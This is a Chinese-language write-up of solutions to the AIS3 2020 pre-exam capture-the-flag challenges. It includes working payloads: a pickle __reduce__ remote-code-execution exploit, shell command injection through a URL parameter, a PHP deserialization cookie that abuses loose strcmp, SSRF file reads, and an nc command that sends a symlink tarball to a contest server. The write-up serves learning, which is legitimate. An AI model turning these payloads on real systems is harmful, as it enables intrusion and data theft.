# AIS pre-exam 2020 writeup
## misc
### Piquero
這題就是盲人編碼 點字

我是對應出字母再找符號

https://www.mathsisfun.com/braille-translation.html

再利用flag格式 就可以解出來
### Karuego
給你圖片 裡面可以解出zip 和另外一張圖片

zip裡面有flag 但是有密碼

我是直接暴力解密碼 `lafire`

引用official
>這題是想出簡單的 stego 題，所以綜合了各種圖片常用的技巧來出題，上述解法只是其中一種，其實加密的壓縮檔可以直接使用 rockyou.txt 或是 John the Ripper 等工具暴力破解，另外壓縮檔的檔案結構沒有加密，可以在其中找到一張圖片 (3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg)，搜尋一下這張圖的原圖，再使用 pkcrack 做 known-plaintext attack 也可以解開。

或是可以 zsteg -a Karuego.png|grep text 就可以find key

setslove 打開 data extract 勾 rgb 0

### Soy
給你qrocde 有些地方被汙染 

https://merricx.github.io/qrazybox/

記得白色的也要填色

>這題可以參考英文版 Wiki，在題目的 QRcode 中，被遮住的部分是容錯區塊，格式區塊以及資料區塊都是正常的，如果不管容錯的話，裡面存的資料是可以正確地解開的，而平常使用的解碼程式都會考慮容錯的部分，因此不會輸出儲存的資料。這題可以使用線上工具或是跟著格式手解，解答請參考下圖：
### Shichirou
當初我以為要爆破 hash 後來想想根本不可能

解法是用ln -s 軟連結先造好 包成tar 送過去給server

讓他自己跟自己hash 

```sh
ln -s ../flag.txt guess.txt 
tar -cf test.tar guess.txt  
echo "10240\r\n$(cat test.tar)"|nc 60.250.197.227 11000
```
### Saburo 
當初這題根本不知道要幹嘛 只知道好像是timing attack

> Solution
這題考的是 timing attack，隨著猜對的字越多，所需的時間就會越久，可以利用這個特性逐字檢驗，找出可能性最高的字。不過檢驗一個字元所需的時間是浮動的，雖說多檢驗一個字的確會花比較多時間，但浮動的範圍卻會越來越大，檢驗一個字元所需的時間為 11~15 ms，假設檢驗到第 10 個字元，得到的結果最快跟最慢可以差到 50 ms，這個問題會增加檢驗的難易度。

>為了解決上述問題，必須使用一些技巧來避免誤判，首先是要確定哪個答案是錯的，當不斷往上增加時，得到的數字如果沒有繼續增加就代表前面可能有字元猜錯，這邊可以將前幾個字的差值平均，並與現在的差值做比較 (例如判斷現在的差值是否大於原差值的一半)，如果發現是錯的，就往前一個字元重找，除此之外，也可以將同個字串送多次來取得平均值，來求得比較穩定的答案。

>Note
這題原本的設計是使用 cpu time 來計算，但比賽開始後，因為很多人一起測，得到的時間其實不太穩定，因此比賽開始後幾小時我就將題目回傳的時間改成 time += 11 + random()%5 了，但賽中許多同學依然認為是系統不穩定造成的，並沒有發現這題真正的考點並加以改善，有點可惜QQ。
### Clara
later
## pwn
### BOF
看解答發現可以直接call func 就可以拿shell

我當時用r2看 找不到func 又只有看到system 且手上沒有ida 

所以就直接簡單的兜出rop 

### Nonsense
輸入東西 他會檢查是不是 字<=31 以及有沒有含有 `wubbalubbadubdub`
如果找出`wubbalubbadubdub` 就完成檢查 之後直接執行 你輸入的東西

所以有兩種解法 其一 offical 是 生出 ascii的shellcode 

official 寫得很... 棒

另一種是  塞ja+`wubbalubbadubdub`+shellcode  

這一種是用ja 0x22 就是以ja這條指令 往後跳0x22  參見way1.py

ascii 0x20~0x7f 有一堆跳轉和xor and sub

http://faydoc.tripod.com/cpu/jb.htm

http://ref.x86asm.net/coder32.html#x0F01
### Portal gun
其實這題根本不難

我當初根本不知道他給hook.so 要幹嘛 

後來發現system 被hook過 所以跳上去不會跑 system

一樣有三種解法 重新hook onegadget 自己跳system

有時候leak出來的東西不知道為啥會接不到 要recvline(2)

就是用rop leak lic 然後上面三種方法選一個 
### Morty school
它有給你libc 並且程式跑起來有給puts的位置
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```
可以先算出libc base的位置

接著發現它input要挑哪個morty時 沒有判斷

![](https://github.com/0xdeciverAngel/ais3-2020-preexam/blob/master/morty_school%20(3).jpg?raw=true)

`v2 = read(0, *(void **)(v4 = (__int64)&unk_6020A0 + input*24 + 0x10), 0x100uLL);`

所以可以給位置 寫上你給它的位置上的地址的值

雙重指標就是了 

這樣就可以hijack `__stack_chk_fail got `的位址

把它的got改成rop  之後觸發canary 就好了

![](https://github.com/0xdeciverAngel/ais3-2020-preexam/blob/master/morty_school%20(2).jpg?raw=true)
![](https://github.com/0xdeciverAngel/ais3-2020-preexam/blob/master/morty_school%20(1).jpg?raw=true)
*我不確定是不是先讓*


## web 
### Squirrel 
知道是command inj 但是不知道要去哪裡撈資料

反正就是一堆奇淫怪招 最後flag 是放在跟目錄
```
/api.php?get='|bash -c 'ls 任意執行cmd
/api.php?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt' ;ls /;echo'
ls /
或是curl 用grep find 抓
考驗對cmd熟悉度 
```
### shark
有給hint 知道flag 在某台區往機器上

一樣先讀原始碼 這題是ssrf

讀/?path=file///proc/net/fib_trie

讀出來發現應該是 172.22.?.?

所以我就寫腳本爆破

有其他人是讀 /etc/hosts /proc/net/tcp
### Elephant 
當初這題有注意到.git 403 

以為不能動手腳 結果可以 用gitdumper 把紀錄抓下來

用hard reset 回去 看code

```php
<?php
 
const SESSION = 'elephant_user';
$flag = file_get_contents('/flag');
 
 
class User {
    public $name;
    private $token;
 
    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }
 
    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}
 
if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}
 
 
$user = NULL;
 
if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}
 
 
 
?><!DOCTYPE html>
<head>
    <title>Elephant</title>
    <meta charset='utf-8'>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <?php if (!$user): ?>
        <div id="login">
            <h3 class="text-center text-white pt-5">Are you familiar with PHP?</h3>
            <div class="container">
                <div id="login-row" class="row justify-content-center align-items-center">
                    <div id="login-column" class="col-md-6">
                        <div id="login-box" class="col-md-12">
                            <form id="login-form" class="form" action="" method="post">
                                <h3 class="text-center text-info">What's your name!?</h3>
                                <div class="form-group">
                                    <label for="name" class="text-info">Name:</label><br>
                                    <input type="text" name="name" id="name" class="form-control">
                                </div>
                                <div class="form-group">
                                    <input type="submit" name="submit" class="btn btn-info btn-md" value="let me in">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <?php else: ?>
        <h3 class="text-center text-white pt-5">You may want to read the source code.</h3>
        <div class="container" style="text-align: center">
            <img src="images/elephant2.png">
        </div>
        <hr>
        <div class="container">
            <div class="row justify-content-center align-items-center">
                <div class="col-md-6">
                    <div class="col-md-12">
                        <h3 class="text-center text-info">Do you know?</h3>
                        <h3 class="text-center text-info">PHP's mascot is an elephant!</h3>
                        Hello, <b><?= $user->name ?></b>!
                        <?php if ($user->canReadFlag()): ?>
                            This is your flag: <b><?= $flag ?></b>
                        <?php else: ?>
                            Your token is not sufficient to read the flag!
                        <?php endif; ?>
                        <a href="?logout">Logout!</a>
                    </div>
                </div>
            </div>
        </div>
    <?php endif ?>
</body>
```
比較重要的是 
```php
function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
```
>只要讓 strcmp($flag, $this->token) == 0 就好啦，那 strcmp 已知的問題就是他 compare 陣列隨然會噴 Warning，但結果會是 NULL，而這裡是用兩個 = 不是三個，所以 NULL == 0，把下面這段 base64 encode 後放回 Cookie 就完成啦。

>`O:4:"User":2:{s:4:"name";s:1:"a";s:11:"\x00User\x00token";a:0:{}}`
看了別人的解法 有些是通靈 有些差不多 就是觸發錯誤 拿到flag
### Snake 
一進去就可以看到原始碼
```python
from flask import Flask, Response, request
import pickle, base64, traceback
Response.default_mimetype = 'text/plain'
app = Flask(__name__)
@app.route("/")
def index():
    data = request.values.get('data')
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            if data and not data:
                return open('/flag').read()
            return str(data)
        except:
            return traceback.format_exc()
    return open(__file__).read()
```
知道`if data not data`一定過不去

所以應該是pickle有問題 

官方文件也有提到pickel.loads不安全 可以ACE

抄一下官方解
```python 
import pickle, base64

class Foo:
    def __reduce__(self):
        return (eval, ('open("/flag").read()',))

print(base64.b64encode(pickle.dumps(Foo())))
# b'gANjYnVpbHRpbnMKZXZhbApxAFgUAAAAb3BlbigiL2ZsYWciKS5yZWFkKClxAYVxAlJxAy4='
```
或是這樣
```python
import pickle, base64, traceback
import  subprocess
base64.b64encode(pickle.dumps({'test':12}))

class Test(object):
  def __reduce__(self):
       return (subprocess.check_output, (['cat', '/flag'],))

'https://snake.ais3.org/?data={}'.format(base64.b64encode(pickle.dumps(Test())).decode('utf-8'))
```
其實上面提到的`if data not data `可以pass 參考官方解
### Rhino
先逛逛 /robots.txt 有東西

發現應該是用node js 寫的

就看看package.json 有寫過node 應該都知道

發現主要執行在 chill.js

```js
const express = require('express');
const session = require('cookie-session');

let app = express();

app.use(session({
  secret: "I'm watching you."
}));

app.use('/', express.static('./'));

app.get('/flag.txt', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');

  let n = req.session.magic;

  if (n && (n + 420) === 420)
    res.sendFile('/flag');
  else
    res.send('you are a sad person too');
});

app.get('*', function(req, res){
  res.status(404).sendFile('404.html', { root: __dirname });
});

app.listen(process.env.PORT, '0.0.0.0');
```
反正考點就是 n 小數點太多會不精確 所以可以設n=0.000000000000000000001

js 是 弱型別 

接下來cookie 就是環境自己架起來 找出值

>curl ip -I

送回去就好
## reverse
### TsaiBro
去年的考古題

就是tap code 有表可以對應回去

有人的解法是爆破開來 找到每個英文字對應的 反推回去

### Fallen Beat
說真的 已經忘記當初怎麼解了

我記得一開始是 改 hell.txt 但發現好像不行

反編譯 找到flag 有定義 他有跟cache做加密  

找到cache 是讀hell.txt 所以解密就好 

當初的腳本不知道跑去哪裡了
### Stand up!Brain
先逆向 發現只吃最多6個字

所以理論上可以暴力 但是我沒做

offical 說 這題是 Brainfuck interpreter

把 裡面的 brainfuck 的東西 挖出來

跑起來發現沒用 觀察到最後面有一堆] 把它去掉 開頭也對應去掉

剩下的用線上工具跑起來就是flag了
### Long Island Iced Tea
打開ida看 會發現這是一題加密題

他會先做zero pading  在加密 XTEA

他只有對第一塊做加密而已 9次 

另一種解法 因為只有第一塊有加密

所以可以先還原出後面的東西 前面固定有AIS3{

剩下的爆破就好 

參見官方解
###  La vie en rose
給你個exe檔 一看icon 就是用python 寫的

如果不知道就看他用了哪些api 你會發現它是用3.8

嘖 這題看官解比較好 
### Uroboros
看官解

## Crypto
### Brontosaurus

就去年的題目 jsfuck

把它給你東西反轉過來 執行就會噴flag了

### T-Rex
就是他有給你表 對應出來就好了

### Octopus
BB84 qkd 兩邊的basis qubits都有給 

basis都一樣的quibit弄出來 解碼就好

### blowfish 
給原始碼跟 `user.pickle` 把 `user.pickle` 印出來

```
[{'name': 'maojui', 'password': 'SECRET', 'admin': False}, 
{'name': 'djosix', 'password': 'S3crE7', 'admin': False}, 
{'name': 'kaibro', 'password': 'GGInIn', 'admin': False}, 
{'name': 'others', 'password': '_FLAG_', 'admin': False}]
```
因為適用crt加密 且他東西有給齊 所以可以把key搞出來

密文 xor 明文 ->key 

key 出來後 東西給他改好 再加密包base64送回去

----
## ref
